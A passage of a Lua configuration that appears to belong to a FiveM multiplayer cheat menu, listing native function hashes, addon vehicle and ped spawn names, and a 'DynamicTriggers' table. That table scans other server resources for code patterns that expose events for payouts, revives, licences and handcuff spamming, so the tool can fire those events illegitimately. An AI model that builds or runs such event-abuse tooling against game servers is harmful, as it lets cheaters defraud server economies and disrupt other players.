               ['SetPedSuffersCriticalHits'] = '0xEBD76F2359F190AC',
               ['SetWeatherTypeNowPersist'] = '0xED712CA327900C8A',
               ['IsThisModelABicycle'] = '0xBF94DD42F63BDED2',
               ['IsThisModelABoat'] = '0x45A9187928F4B9E3',
               ['IsThisModelAHeli'] = '0xDCE4334788AF94EA',
               ['IsThisModelACar'] = '0x7F6DB52EEFC96DF8',
               ['IsThisModelAJetski'] = '0x9537097412CF75FE',
               ['IsThisModelAPlane'] = '0xA0948AB42D7BA0DE',
               ['IsThisModelATrain'] = '0xAB935175B22E822B',
               ['IsThisModelAQuadbike'] = '0x39DAC362EE65FA28',
               ['IsThisModelAnAmphibiousCar'] = '0x633F6F44A537EBB6',
               ['IsThisModelAnAmphibiousQuadbike'] = '0xA1A9FC1C76A6730D',
               ['SetPlayerAngry'] = '0xEA241BB04110F091',
               ['TaskCombatPed'] = '0xF166E48407BAC484',
               ['IsPedDeadOrDying'] = '0x3317DEDB88C95038',
               ['GetCurrentResourceName'] = '0xE5E9EBBB',
               ['SetFollowPedCamViewMode'] = '0x5A4F9EDF1673F704',
               ['TaskSmartFleeCoord'] = '0x94587F17E9C365D5',
               ['SetPedCombatAbility'] = '0xC7622C0D36B2FDA8',
               ['SetPedCombatMovement'] = '0x4D9CA1009AFBD057',
               ['SetCombatFloat'] = '0xFF41B4B141ED981C',
               ['SetPedAccuracy'] = '0x7AEFB85C1D49DEB6',
               ['SetPedFiringPattern'] = '0x9AC577F5A12AD8A9',
               ['GetClosestVehicleNodeWithHeading'] = '0xFF071FB798B803B0',
               ['CreatePedInsideVehicle'] = '0x7DD959874C1FD534',
               ['TaskVehicleDriveToCoordLongrange'] = '0x158BB33F920D360C',
               ['GetWeaponDamage'] = '0x3133B907D8B32053',
               ['FindFirstVehicle'] = '0x15e55694',
               ['FindNextVehicle'] = '0x8839120d',
               ['EndFindVehicle'] = '0x9227415a',
               ['GiveDelayedWeaponToPed'] = '0xB282DC6EBD803C75',
               ['SetVehicleDoorsLockedForAllPlayers'] = '0xA2F80B8D040727CC',
               ['SetVehicleDoorsLockedForPlayer'] = '0x517AAF684BB50CD1',
               ['ModifyVehicleTopSpeed'] = '0x93A3996368C94158',
               ['SetVehicleCheatPowerIncrease'] = '0xB59E4BD37AE292DB',
               ['RemoveWeaponFromPed'] = '0x4899CB088EDF59B8',
               ['DrawLine'] = '0x6B7256074AE34680',
               ['GetEntityVelocity'] = '0x4805D2B1D8CF94A9',
               ['ApplyForceToEntity'] = '0xC5F68BE9613E2D18',
               ['GetGameplayCamCoord'] = '0x14D6F5678D8F1B37',
               ['GetCurrentPedWeaponEntityIndex'] = '0x3B390A939AF0B5FC',
               ['SetPedToRagdoll'] = '0xAE99FB955581844A',
               ['SetPedCanRagdollFromPlayerImpact'] = '0xDF993EE5E90ABA25',
               ['StatSetInt'] = '0xB3271D7AB655B441',
               ['SetBlipCoords'] = '0xAE2AF67E9D9AF65D',
               ['SetBlipCategory'] = '0x234CDD44D996FD9A',
               ['AddBlipForCoord'] = '0x5A039BB0BCA604B6',
               ['BeginTextCommandSetBlipName'] = '0xF9113A30DE5C6670',
               ['EndTextCommandSetBlipName'] = '0xBC38B49BCB83BC9B',
               ['SetPedCanBeKnockedOffVehicle'] = '0x7A6535691B477C48',
               ['IsEntityAPed'] = '0x524AC5ECEA15343E',
               ['GetEntityPlayerIsFreeAimingAt'] = '0x2975C866E6713290',
               ['SetPedShootsAtCoord'] = '0x96A05E4FB321B1BA',
               ['IsEntityAVehicle'] = '0x6AC7003FA6E5575E',
               ['IsEntityAnObject'] = '0x8D68C8FD0FACA94E',
               ['IsModelAPed'] = '0x75816577FEA6DAD5',
               ['SetVehicleReduceGrip'] = '0x222FF6A823D122E2',
               ['SetVehicleDoorsLocked'] = '0xB664292EAECF7FA6',
               ['TaskVehicleTempAction'] = '0xC429DCEEB339E129',
               ['RenderFakePickupGlow'] = '0x3430676B11CDF21D',
               ['ResetEntityAlpha'] = '0x9B1E824FFBB7027A',
               ['NetworkGetPlayerIndexFromPed'] = '0x6C0E2E0125610278',
               ['IsPedAPlayer'] = '0x12534C348C6CB68B',
   
               ['GetPedSourceOfDeath'] = '0x93C8B64DEB84728C',
               ['SetPedRandomProps'] = '0xC44AA05345C992C6',
               ['SetPedRandomComponentVariation'] = '0xC8A9481A01E63C28',
               ['SetVehicleAlarmTimeLeft'] = '0xc108ee6f',
               ['GetIsVehicleEngineRunning'] = '0xAE31E7DF9B5B132E',
               ['SetVehicleUndriveable'] = '0x8ABA6AF54B942B95',
               ['TaskVehicleDriveToCoord'] = '0xE2A2AA2F659D77A7',
               ['SetPedCombatRange'] = '0x3C606747B23E497B',
               ['GetIsTaskActive'] = '0xB0760331C7AA4155',
               ['GetPlayerFromServerId'] = '0x344ea166',
               ['PedToNet'] = '0x0EDEC3C276198689',
               ['TaskVehicleDriveWander'] = '0x480142959D337D00',
               ['SetEntityHeading'] = '0x8E2530AA8ADA980E',
               ['TaskWanderStandard'] = '0xBB9CE077274F6A1B',
           },
           AddonVehs = {
               {spawn = "divo", name = "Bugatti Divo"}, {spawn = "latmc", name = ""},
               {spawn = "camaro", name = "Camaro"},
               {spawn = "brabus500", name = ""}, {spawn = "brabus550", name = ""},
               {spawn = "g500", name = "Mercedes G500"}, {spawn = "h2carb", name = "Ninja H2"},
               {spawn = "teslax", name = "Tesla Model X"}, {spawn = "BENTAYGA17", name = "Bentley Bentayga"},
               {spawn = "yz450f", name = "Yamaha YZ450F"}, {spawn = "tmsm", name = "TM450 Supermoto"},
               {spawn = "rmz250", name = "Suzuki RMZ 250"}, {spawn = "WRAITH", name = "Rolls Royce Wraith"},
               {spawn = "URUS", name = "Lamborghini Urus"}, {spawn = "demon", name = "Dodge Demon"},
               {spawn = "BMWI8", name = "BMW i8"}, {spawn = "rrst", name = "Range Rover Vogue"},
               {spawn = "M6F13", name = "BMW M6"}, {spawn = "CHARGER", name = "Dodge Charger"},
               {spawn = "19gt500", name = "Ford Mustang Shelby"}, {spawn = "exor", name = "Camaro Exorcist"},
               {spawn = "SVJ", name = "Lamborghini Aventador SVJ"}, {spawn = "demonhawk", name = "Demonhawk"},
               {spawn = "911", name = "Porsche 911 Turbo"}, {spawn = "GT2RS", name = "Porsche GT2"},
               {spawn = "CONTSS18", name = "Bentley Continental GT"}, {spawn = "FERRARI812", name = "Ferrari 812"},
               {spawn = "BENTAYGA17", name = "Bentley Bentayga"}, {spawn = "458spc", name = "Ferrari 458"},
               {spawn = "63LB", name = "Mercedes CLS 63"}, {spawn = "c63scoupe", name = "Mercedes C63s"},
               {spawn = "MVISIONGT", name = "Mercedes-Benz AMG Vision GT"}, {spawn = "sv", name = "Lamborghini Aventador SV"},
               {spawn = "GTRC", name = "Mercedes-Benz AMG GT-R"}, {spawn = "SENNA", name = "McLaren Senna"},
               {spawn = "C7", name = "Corvette C7"}, {spawn = "LWGTR", name = "Liberty Walk GTR"},
               {spawn = "AR8LB", name = "Audi R8"}, {spawn = "g63mg", name = "G63 Mansory"},
               {spawn = "scaldarsi", name = "Maybach Emperor"}, {spawn = "bm8c", name = "BMW M8 CoupÃ©"},
               {spawn = "jes", name = "Koenigsegg Jesko"}, {spawn = "cczl", name = "Camaro on 32s"},
               {spawn = "c8", name = "Corvette C8"}, {spawn = "bentaygam", name = "Bentayga Mansory"},
               {spawn = "mlmansory", name = "Levante Mansory"}, {spawn = "dawn", name = "Mansory RR Dawn"},
               {spawn = "ursa", name = "Porsche Macan"}, {spawn = "gle63c", name = "GLE Amg"},
               {spawn = "sr650fly", name = "Sea Ray 650"}, {spawn = "BMWM8", name = "BMW M8"},
               {spawn = "19S650", name = "Maybach S650"}, {spawn = "amggtsmansory", name = "AMG GTS Mansory"},
               {spawn = "G63AMG6x6", name = "Brabus 6x6"}, {spawn = "qx56", name = "Infinity QX56"},
               {spawn = "vantage", name = "Aston Martin Vantage"}, {spawn = "svr16", name = "Range Rover Sport"},
               {spawn = "x6m", name = "BMW X6M"}, {spawn = "a8lw12", name = "Audi A8L"},
               {spawn = "corvetteZR1", name = "Corvette ZR1"}, {spawn = "720stc", name = "McLaren 720s"},
               {spawn = "TMODEL", name = "Tesla Model3"}, {spawn = "kiagt", name = "Kia Stinger"},
               {spawn = "rs5r", name = "Audi RS5R"}, {spawn = "R8v10", name = "Audi R8 V10"},
               {spawn = "cayenne", name = "Porsche Cayenne Turbo"}, {spawn = "NISALTIMA", name = "Nissan Altima"},
               {spawn = "TR22", name = "Tesla Roadster"}, {spawn = "Mb400", name = "Mercedes EQC400"},
               {spawn = "2020silv", name = "2020 Chevrolet Silverado"}, {spawn = "foxrossa", name = "Ferrari 512 TR 1991"},
               {spawn = "M3E30", name = "BMW E30 M3"}, {spawn = "foxharley2", name = "Harley Davidson"},
               {spawn = "foxharley1", name = "Harley Davidson Slimbob"}, {spawn = "denalihd", name = "Denali"},
               {spawn = "fox600lt", name = "Mclaren 600LT 2020"}, {spawn = "m6x6", name = "Mercedes 6X6 Geries Brabus AMG"},
               {spawn = "foxrover1", name = "Range Rover Evoque 2016"}, {spawn = "tonkat", name = "Toyota Tonka Hilux"},
               {spawn = "kuga", name = "Ford Kuga"}, {spawn = "silvias15", name = "Nissan Silvia S-15"},
               {spawn = "rx7rb", name = "Mazda RX7"}, {spawn = "fto", name = "Mitsubishi FTO"},
               {spawn = "mr2sw20", name = "Toyota MR-2 GT"}, {spawn = "eclipsegt06", name = "Mitsubishi Eclipse GT"},
               {spawn = "SkylineGTR", name = "SKYLINE GTR R34"}, {spawn = "terzo", name = "Lamborghini Terzo"},
               {spawn = "CAN", name = "Can AM"}, {spawn = "2020ss", name = "2020 Chevrolet Camaro"},
               {spawn = "rmodveneno", name = "Lamborghini Veneno"}, {spawn = "gurkha", name = "Gang Insurgent"},
               {spawn = "p1", name = "2020 McLaren P1"}, {spawn = "viper", name = "Viper SRT"},
               {spawn = "TypeR17", name = "Civic TypeR"}, {spawn = "sc18", name = "Lamborghini SC18"},
               {spawn = "XJ", name = "Jaguar XJ"}, {spawn = "lp700", name = "Lamborghini LP700"},
               {spawn = "Huracan", name = "Lamborghini Huracan"}, {spawn = "TESLAPD", name = "Tesla Model"},
               {spawn = "S63W222", name = "Mercedes S63"}, {spawn = "foxct", name = "Tesla Cyber Truck"},
               {spawn = "foxsterrato", name = "Lamborghini Sterrato 2020"}, {spawn = "foxsian", name = "Lamborghini Sian"},
               {spawn = "foxevo", name = "Huracan Evo"}, {spawn = "foxsupra", name = "Toyota Supra GR 2020"},
               {spawn = "h3", name = "Hummer 3"}, {spawn = "foxleggera", name = "Aston Martin  DBS"},
               {spawn = "rmodi8mlb", name = "BMW i8 Liberty Walk"}, {spawn = "CORVETTE", name = "C7 Widebody"},
               {spawn = "slingshot", name = "slingshot"}, {spawn = "f8rarri", name = "Ferrari F8"},
               {spawn = "forgiato", name = "Hellcat Charger Widebody"}, {spawn = "ts1", name = "Zenvo TS1"},
               {spawn = "jeepg", name = "Jeep Gladiator"}, {spawn = "GRANDGT18", name = "Porsche Panamera Sport"},
               {spawn = "2008f150", name = "2008 F150"}, {spawn = "lccreaper", name = "LCC Reaper"},
               {spawn = "REMOWER", name = "LawnMower"}, {spawn = "EVO10", name = "Lancer EVO"}, 
               {spawn = "vip8", name = "Dodge Viper"}, {spawn = "ELLCHARG", name = "Ellie SuperCharged"},
               {spawn = "G770", name = "Lumma CLR G770"},{spawn = "IMPALASS2", name = "Chevrolet Impala 1964"}, 
               {spawn = "fox720s", name = "Mclaren 720s"}, {spawn = "CHIRON", name = "Police Chiron"},
               {spawn = "polp1", name = "Police Mclaren P1"}, {spawn = "AVENTADOR", name = "Police Aventador"},
               {spawn = "Custom", name = "Police R1 Bike"}, {spawn = "CENTENARIO", name = "Police LP770"},
               {spawn = "Mustang", name = "Police Mustang"}, {spawn = "rmodamgc63", name = "AMG C63"},
               {spawn = "audipd", name = "Police Audi"}, {spawn = "MRAP", name = "Police MRAP"},
               {spawn = "CHIRON17", name = "Bugatti Chiron"}, {spawn = "can", name = "Can AM"},
               {spawn = "rmodmustang", name = "Mustang"}, {spawn = "beck", name = "F1 Type Car"},
               {spawn = "bugatti", name = "Bugatti Veyron"}, {spawn = "foxezri", name = "Ferrari Xezri"},
               {spawn = "exgtr", name = "EX GTR"}, {spawn = "f824slw", name = "Dandogg Car"},
               {spawn = "rculi", name = "Rolls Royce Cullinan"}, {spawn = "raptor150", name = "Raptor F-150"},
               {spawn = "rs6c8", name = "Audi RS6"}, {spawn = "ren_clio_5", name = "Renalt Clio V"},
               {spawn = "caprice13", name = "Chevrolet Caprice"}, {spawn = "elantra07", name = "Hyundai Elantra"},
               {spawn = "familiac", name = "Mazda Familia"}, {spawn = "trhawk", name = "Jeep TrackHawk"},
               {spawn = "ramlh20", name = "Dodge Ram Longhorn"}, {spawn = "mach1", name = "Ford Mustang Mach 1"},
               {spawn = "h1", name = "HUMMER H1"}, {spawn = "h2", name = "HUMMER H2"},
               {spawn = "humvee", name = "humvee"}, {spawn = "hummer", name = "HUMMER H1"},
               {spawn = "cbr1000rrr", name = "Honda CBR1000RR"}, {spawn = "rmodmi8lb", name = "Liberty Walk i8"},
               {spawn = "Skyline", name = "Nissan Skyline GTR"}, {spawn = "boss302", name = "Ford Mustang Boss 302"},
               {spawn = "exc530", name = "KTM EXC 530"}, {spawn = '20x5m', name = "BMW X5M"},
               {spawn = 'thekart', name = 'Go Kart'}, {spawn = 'rmodm4', name = 'BMW M4'},
               {spawn = 'rmodx6', name = 'BMW X6'}, {spawn = 'x5m', name = 'BMW X5M'},
               {spawn = 'bcps', name = 'Bugatti Chrion'}, {spawn = 'bdivo', name = 'Bugatti Divo'},
               {spawn = 'aperta', name = 'Ferrari Laferrari Aperta'}, {spawn = 'f40', name = 'Ferrari F40'},
               {spawn = 'eltransit', name = 'Ford Transit'}, {spawn = 'explorer20', name = 'Ford Explorer'},
               {spawn = 'mclarengt', name = 'McLaren GT'}, {spawn = '720s', name = 'McLaren 720s'},
               {spawn = 'amggtc', name = 'Mercedes AMG GTC'}, {spawn = 'arrow', name = 'Mercedes Arrow'},
               {spawn = 'brabus850', name = 'Brabus 850'}, {spawn = 'e63amg', name = 'Mercedes E63 AMG'},
               {spawn = 'nissantitan17', name = 'Nissan Titan'}, {spawn = 'cayenneturbo', name = 'Porche Cayenne Turbo'},
               {spawn = 'golfgti', name = 'Volkswagon Golf GTI'}, {spawn = 'q8prior', name = 'Audi Q8'},
               {spawn = 'rs666', name = 'Audi RS6'}, {spawn = '190e',  name = 'Mercedes 190E'},
               {spawn = 'golfmk7', name = 'Volkswagon Golf Mk7'}, {spawn = 'rmodjeep', name = 'Jeep Wrangler?'},
               {spawn = 'raid', name = 'Doge Challenger Raid'}, {spawn = 'bentaygast', name = 'Bently Bentayga'},
               {spawn = 'st', name = 'Ford Feista'}, {spawn = "gtr", name = "Nissan GTR r35"},
               {spawn = "19dbs", name = "2019 Aston Martin DBS"}, {spawn = "16challenger", name = "2016 challenger"},
               {spawn = "450crf", name = "Honda 450CRF"}, {spawn = "911", name = "Porshe 911"},
               {spawn = "amggtsprior", name = "Mercedes AMG GTS Prior"}, {spawn = "lb750sv", name = "Lamborghini Aventador LB750SV"},
               {spawn = "rculi", name = "Rolls Royce Cullian"}, {spawn = "raptor150", name = "Ford Raptor"},
               {spawn = "ren_clio_5", name = "Renault Clio"}, {spawn = "caprice13", name = "Chevrolet Caprice"},
               {spawn = "elantra07", name = "20017 Hyundai Elantra"}, {spawn = "familiac", name = "Mazda Familia"},
               {spawn = "lp770", name = "Lamborghini Centenario"}, {spawn = "brz", name = "Subaru Brz"},
               {spawn = "agera", name = "Koenigsegg Agera"}, {spawn = "cbr1000", name = "Honda CBR 1000RR"},
               {spawn = "g500", name = "Mercedes G500"}, {spawn = "h2carb", name = "2017 Kawasaki H2 Carbon"},
               {spawn = "ar8lb", name = "Liberty Walk BMW I8"}, {spawn = "g63mg", name = "Mercedes AMG G63"},
               {spawn = "scaldarsi", name = "Scaldarsi Emperor"}, {spawn = "db11", name = "Aston Martin DB11"},
               {spawn = "f82", name = "BMW M4"}, {spawn = "g63", name = "Mercedes G63"},
               {spawn = "gt63", name = "Mercedes GT 63"}, {spawn = "rmodamgc63", name = "Mercedes AMG c63"},
               {spawn = "rmodx6", name = "BMW X6"}, {spawn = "x5m", name = "BMW X5"},
               {spawn = "rs666", name = "Widebody Audi RS6"}, {spawn = "golfmk7", name = "VW Golf MK7"},
               {spawn = "rmodmustang", name = "Ford Mustang"}, {spawn = "rmodrs6", name = "Audi rs6"},
               {spawn = "golfmk7", name = "VW Golf MK7"}, {spawn = "corvettezr1", name = "Corvette C7 ZR1"},
               {spawn = "bmwm8", name = "BMW M8"}, {spawn = "vantage", name = "Aston Martin Vantage"},
               {spawn = "04acuratsx", name = "2004 Acura STX"}, {spawn = "180sx", name = "Nissan 180sx"},
               {spawn = "18performante", name = "2018 Lamborghini Performante"}, {spawn = "95stang", name = "1995 Ford Mustang"},
               {spawn = "countach", name = "Lamborghini Countach"}, {spawn = "cyrus", name = "Aston Martin Cyrus"},
               {spawn = "czr2", name = "Chevrolet Colorado ZR2"}, {spawn = "dbs2009", name = "2009 Aston Martin DBS"},
               {spawn = "f812", name = "Ferrari F812 Superfast"}, {spawn = "fairlane66", name = "1966 Ford Fairlane"}, 
               {spawn = "cesc21", name = "Cadillac Escalade"}, {spawn = "aimgainnsx", name = "AimGain's Acura NSX"},
               {spawn = "745le", name = "BMW 745le M Sport"}, {spawn = "gmt900escal", name = "GMT Escalade"},
               {spawn = "e30t", name = "BMW E3 e30t"}, {spawn = "m2f22", name = "BMW M2"},
               {spawn = "rmodm4gts", name = "BMW M4 GTS"}, {spawn = "rmodm8gte", name = "BMW M8 GTE"},
               {spawn = "69charger", name = "1969 Dodge Charger"}, {spawn = "rmodchiron300", name = "Bugatti Chiron"},
               {spawn = "rmodbugatti", name = "Bugatti Veyron"}, {spawn = "rmodzl1", name = "Camaro ZL1"},
               {spawn = "velociraptor", name = "Ford velociraptor"}, {spawn = "m82020", name = "2020 BMW M8"},
               {spawn = "golfmk6", name = "VW Golf mk6"}, {spawn = "718caymans", name = "Porshe Cayman S 718"},
               Peds = {
                   {pspawn = "a_m_m_kid_01"}, {pspawn = "a_m_m_kid_02"},
                   {pspawn = "a_m_m_kid_03"}, {pspawn = "a_m_m_baby_01"},
                   {pspawn = "a_m_f_baby_01"}, {pspawn = "a_m_m_fatlatin_02"},
                   {pspawn = "a_m_m_fatlatin_03"}, {pspawn = "player_claude"},
               },
           },
   
           DynamicTriggers = {
               {
                   resource = "esx_vangelico_robbery",
                   resourcelooklike = {"vangelico", "jewlery"},
                   file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
                   lookfor = "ClearPedTasksImmediately.GetPlayerPed.-1..",
                   name = "vangelico_get",
                   noparam = true
                   },
               
                   {
                   resource = "esx_vangelico_robbery",
                   resourcelooklike = {"vangelico", "jewlery"},
                   file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
                   lookfor = "FreezeEntityPosition.playerPed, false.",
                   name = "vangelico_sell",
                   noparam = true
                   },
   
               {
                   resource = "esx_ambulancejob",
                   resourcelooklike = {"esx_ambulancejob", "ambulance"},
                   file = {"client/job.lua", "job.lua"},
                   lookfor = ", data.current.value%)",
                   name = "giveitem",
                   noparam = false
               },
               {
                   resource = "esx_ambulancejob",
                   resourcelooklike = {"esx_ambulancejob", "ambulance"},
                   file = {"client/main.lua", "main.lua"},
                   lookfor = ", data.current.item, data.current.value%)",
                   name = "giveitem2",
                   noparam = false
               },
               {
                   resource = "esx_doorlock",
                   resourcelooklike = {"esx_doorlock", "doorlock"},
                   file = {"client/main.lua", "main.lua"},
                   lookfor = ", 'unlockDoor', 0.8)",
                   name = "doorlock_sound1",
                   noparam = false
               },
               {
                   resource = "InteractSound",
                   resourcelooklike = {"InteractSound", "interact-sound"},
                   file = {"client/main.lua", "main.lua"},
                   lookfor = ", function%(playerNetId, maxDistance, soundFile, soundVolume%)",
                   name = "interact_sound1",
                   noparam = false
               },
   
               
               {
                   resource = "esx_ambulancejob",
                   resourcelooklike = {"esx_ambulancejob", "ambulance"},
                   file = {"client/job.lua", "job.lua"},
                   lookfor = ", GetPlayerServerId%(closestPlayer%)",
                   name = "reviveesx",
                   noparam = false
               },
               {
                   resource = "esx_ambulancejob",
                   resourcelooklike = {"esx_ambulancejob", "ambulance"},
                   file = {"client/main.lua", "main.lua"},
                   lookfor = ", GetPlayerServerId%(closestPlayer%)",
                   name = "reviveesx2",
                   noparam = false
               },
   
               {
               resource = "esx_policejob",
               resourcelooklike = {"esx_policejob", "handcuff"},
               file = {"client/main.lua", "main.lua"},
               lookfor = "action == 'handcuff'",
               name = "policejob_handcuff",
               noparam = false
               },
               {
               resource = "esx_policejob",
               resourcelooklike = {"esx_policejob", "handcuff"},
               file = {"client/main.lua", "main.lua"},
               lookfor = ", GetPlayerServerId%b(),",
               name = "policejob_spammer",
               noparam = false
               },
               {
               resource = "esx_vangelico_robbery",
               resourcelooklike = {"vangelico", "jewlery"},
               file = {"client/esx_vangelico_robbery_cl.lua", "client/main.lua", "main.lua"},
               lookfor = "FreezeEntityPosition.playerPed, false.",
               name = "vangelico_sell",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'CokeField\' then",
               name = "coke_feild",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "",
               name = "coke_process",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "",
               name = "coke_sell",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "",
               name = "meth_field",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "",
               name = "meth_process",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'MethDealer\' then",
               name = "meth_sell",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'WeedField\' then",
               name = "weed_field",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'WeedProcessing\' then",
               name = "weed_process",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'WeedDealer\' then",
               name = "weed_sell",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'OpiumField\' then",
               name = "opium_field",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'OpiumProcessing\' then",
               name = "opium_process",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "elseif CurrentAction == \'OpiumDealer\' then",
               name = "opium_sell",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "CurrentAction = nil",
               name = "stop_feild_coke",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "estCoke",
               name = "stop_process_coke",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "sformCoke",
               name = "stop_sell_coke",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "stopSell",
               name = "stop_feild_meth",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "tMeth",
               name = "stop_process_meth",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "sformMeth",
               name = "stop_sell_meth",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "stopSellM",
               name = "stop_feild_weed",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "vestWeed",
               name = "stop_process_weed",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "ransformWeed",
               name = "stop_sell_weed",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "stopSellW",
               name = "stop_feild_opium",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "stopHarvest",
               name = "stop_process_opium",
               noparam = false
               },
           
               {
               resource = "drugs",
               resourcelooklike = {"esx_illegal_drugs", "esx_drugs", "drugs"},
               file = {"client/main.lua", "client/esx_drugs_cl.lua", "client/main.lua"},
               lookfor = "formOpium",
               name = "stop_sell_opium",
               noparam = false
               },
           
               {
               resource = "esx_dmvschool",
               resourcelooklike = {"dmvschool"},
               file = {"client/main.lua"},
               lookfor = ", Config.Prices%b[]",
               name = "dmv_pay",
               noparam = false,
               },
           
               {
               resource = "esx_dmvschool",
               resourcelooklike = {"dmvschool"},
               file = {"client/main.lua"},
               lookfor = ", %b''",
               name = "dmv_getlicense",
               noparam = false,
               },
               {
               resource = "esx_gopostaljob",
               resourcelooklike = "gopostaljob",
               file = {"client/cl.lua"},
               lookfor = ", currentJobPay%)",
               name = "gopostaljob:pay2",
               noparam = false,
               },
               {
               resource = "esx_gopostaljob",
               resourcelooklike = "gopostaljob",
               file = {'client/main.lua'},
               lookfor = ", amount%)",
               name = "gopostaljob:pay",
               noparam = false,
               },
               {
               resource = "esx_skin",
               resourcelooklike = {"esx_skin", "skin"},
               file = {'client/main.lua'},
               lookfor = "",
               name = "esx_skin:openSaveableMenu",
               noparam = false,
               },
               {
               resource = 'esx_blanchisseur',
               resourcelooklike = 'blanchisseur',
               file = {'client/main.lua'},
               lookfor = ", amount%)",
               name = 'esx_blanchisseur:pay',
               noparam = false,
               },
               {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'CokeField\' then",
               name = 'drugs:cokefield',
               noparam = false,
           },
           {
           resource = "esx_status",
           resourcelooklike = {"status"},
           file = {"client/main.lua"},
           lookfor = ", function%(name, val%)",
           name = 'esx_status_hungerandthirst',
           noparam = false,
           },
   
           
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'CokeProcessing\' then",
               name = 'drugs:cokeprocess',
               noparam = false,
           },
           {
               resource = "drugs",
               resourcelooklike = {'esx_ilegal_drugs', 'esx_drugs', 'drugs'},
               file = {'client/main.lua', 'client/main.lua', 'client/esx_drugs_cl.lua'},
               lookfor = "elseif CurrentAction == \'CokeDealer\' then",
               name = 'drugs:cokesell',
               noparam = false,
